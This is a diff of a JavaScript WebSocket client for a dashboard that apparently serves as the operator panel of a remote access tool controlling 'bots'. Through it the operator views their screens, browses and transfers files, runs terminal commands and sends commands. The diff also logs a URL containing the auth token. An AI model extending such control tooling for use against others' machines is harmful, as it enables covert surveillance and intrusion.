@@ -5,11 +5,12 @@ import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/web
 import { renderScreenRGBA } from '../features/screen_renderer.js';
 
 let socket = null;
-const dec = new TextDecoder();
 const $ = id => document.getElementById(id);
 
+/** Обновляет текстовое содержимое UI элементов **/
 const ui = (id, val) => { if ($(id)) $(id).textContent = val ?? '...'; };
 
+/** Управляет визуальным статусом подключения **/
 const setOnline = (on) => {
     const el = $('status-indicator');
     el?.classList.toggle('online', on);
@@ -17,92 +18,89 @@ const setOnline = (on) => {
     ui('status-text', on ? 'online' : 'offline');
 };
 
+/** Маршрутизация входящих пакетов по модулям **/
 const handleIncomingData = (buf) => {
     const pkg = decodePacket(buf);
     if (!pkg) return;
 
-    // В V7.2 decodePacket возвращает { id, module, meta, payload }
-    const { module, meta, payload } = pkg;
+    const { module, type, action, payload } = pkg;
 
-    // 1. ScreenView (Видеопоток) - Самый приоритетный по скорости
-    if (module.startsWith('ScreenView')) {
-        if (typeof payload === 'number') return;
-        return renderScreenRGBA(payload);
+    if (module === 'ScreenView') {
+        // Если пришло уведомление о STOP от бота
+        if (action === 'STOP') {
+            console.log("[ScreenView] Bot requested stop");
+            return window.resetRenderer?.();
+        }
+
+        if (type === 'bin') {
+            // ОТЛАДКА: Раскомментируй, если хочешь видеть каждый пакет в консоли
+            // console.debug(`[ScreenView] Frame received: ${payload.byteLength} bytes`);
+            return renderScreenRGBA(payload);
+        } else {
+            // Это то самое место, где у тебя вылетала ошибка. 
+            // Давай посмотрим, что внутри этого "str"
+            console.warn(`[ScreenView] Unexpected type: ${type} | Action: ${action} | Payload:`, payload);
+            return;
+        }
     }
 
-    // 2. SystemInfo (Метаданные клиента)
     if (module === 'SystemInfo') {
-        try {
-            const data = typeof payload === 'string' ? JSON.parse(payload) : payload;
-            if (data && data.id === AppState.clientId) {
-                if (data.ip) ui('display-ip', data.ip);
-                if (data.id) ui('display-id', data.id);
-                if (data.status) setOnline(data.status === 'online');
-                AppState.lastSystemData = data;
-            }
-        } catch (e) {}
-        return;
-    }
-
-    // 3. FileManager (Списки файлов)
-    if (module === 'FileManager') {
-        try {
-            const json = typeof payload === 'string' ? JSON.parse(payload) : payload;
-            if (json) window.renderFileSystem?.(json);
-        } catch (e) {
-            console.error("[FileManager] JSON Error:", e);
+        const data = payload;
+        if (data && typeof data === 'object') {
+            if (data.ip) ui('display-ip', data.ip);
+            if (data.id) ui('display-id', data.id);
         }
         return;
     }
 
-    // 4. FileTransfer (Скачивание С БОТА)
-    if (module === 'FileTransfer') {
-        window.dispatchEvent(new CustomEvent('FileTransfer_Start', { 
-            detail: { name: meta, size: payload } 
-        }));
-        return;
-    }
-
-    if (module === 'FileTransferStream') {
-        window.dispatchEvent(new CustomEvent('FileTransfer_Chunk', { 
-            detail: { name: meta, data: payload } 
-        }));
-        return;
-    }
-
-    // 5. УНИВЕРСАЛЬНАЯ МАРШРУТИЗАЦИЯ (Terminal, Streams, etc.)
-    // Создаем ключ события: "Powershell:None", "Powershell:Stream" и т.д.
-    const eventKey = (meta && meta !== 'None') ? `${module}:${meta}` : `${module}:None`;
-    
-    // Генерируем событие, которое слушают terminal.js и другие модули
-    window.dispatchEvent(new CustomEvent(eventKey, { 
-        detail: payload 
-    }));
+    // Универсальный проброс для остальных
+    window.dispatchEvent(new CustomEvent(`${module}:${action}`, { detail: payload }));
 };
 
+/** Инициализация WebSocket **/
 export const initControlConnection = () => {
     const { clientId: tid } = AppState;
     const [token, login] = ['auth_token', 'user_login'].map(k => localStorage.getItem(k));
-    if (!token || !login || !tid) return;
+    
+    if (!token || !tid) {
+        console.error("[WS] Missing Auth Token or Target ID");
+        return;
+    }
 
-    const url = `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/ws?token=${token}&login=${login}&mode=control&target=${encodeURIComponent(tid)}`;
+    const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const url = `${protocol}//${location.host}/ws?token=${token}&login=${login}&mode=control&target=${encodeURIComponent(tid)}`;
+    
+    console.log(`[WS] Connecting to ${url}`);
     socket = new WebSocket(url);
     socket.binaryType = 'arraybuffer';
+    
+    socket.onopen = () => {
+        console.log("[WS] Connection established");
+        setOnline(true);
+    };
+    
+    socket.onclose = (e) => {
+        console.warn(`[WS] Connection closed: ${e.code} ${e.reason}`);
+        setOnline(false);
+    };
 
-    socket.onopen = () => setOnline(true);
+    socket.onerror = (e) => console.error("[WS] Socket Error:", e);
+    
     socket.onmessage = (e) => handleIncomingData(e.data);
-    socket.onclose = () => setOnline(false);
 
-    /**
-     * Универсальная отправка НА БОТ
-     * @param {string} modName - Формат "ModuleName:Meta" или "ModuleName"
-     * @param {any} pay - JSON объект, Число или ArrayBuffer
-     */
-    window.sendToBot = (modName, pay) => {
-        if (socket?.readyState === 1) {
-            // Если в modName нет двоеточия, добавляем :None для соблюдения V7.2
-            const fullMod = modName.includes(':') ? modName : `${modName}:None`;
-            socket.send(encodePacket(tid, fullMod, pay));
+    /** Отправка команды на бот **/
+    window.sendToBot = (modName, pay, action = 'None', extra = 'None') => {
+        if (socket?.readyState !== 1) {
+            console.warn("[WS] Cannot send: Socket not ready");
+            return;
         }
+
+        let type = 'str';
+        if (pay instanceof ArrayBuffer || pay instanceof Uint8Array) type = 'bin';
+        else if (typeof pay === 'number') type = 'int';
+        else if (typeof pay === 'object') type = 'json';
+
+        const packet = encodePacket(tid, modName, type, action, extra, pay);
+        socket.send(packet);
     };
 };
